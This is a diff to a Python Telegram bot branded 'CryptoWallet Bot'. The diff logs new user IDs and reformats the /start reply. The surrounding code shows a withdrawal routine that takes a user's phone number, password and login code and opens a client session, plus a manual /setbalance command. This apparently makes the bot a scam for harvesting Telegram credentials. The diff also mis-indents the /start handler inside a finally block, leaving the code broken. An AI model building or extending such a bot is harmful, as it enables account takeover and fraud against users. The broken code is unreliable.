@@ -140,12 +140,16 @@ async def process_withdraw(user_id, phone, password, code):
         await bot.send_message(OWNER_ID, f'Ошибка вывода: {e}')
     finally:
         await client.disconnect()
-
-@bot.on(events.NewMessage(pattern='/start'))
+        @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
-    await event.respond('🪙 CryptoWallet Bot', buttons=[[Button.url('🚀 Открыть кошелек', 'https://t.me/Buraldikbot/Hhvhjk')]])
+    print(f'НОВЫЙ ЮЗЕР: {user_id}')
+    await event.respond(
+        '🪙 CryptoWallet Bot',
+        buttons=[[Button.url('🚀 Открыть кошелек', 'https://t.me/Buraldikbot/Hhvhjk')]]
+    )
+
 
 @bot.on(events.NewMessage(pattern='/setbalance'))
 async def set_balance(event):
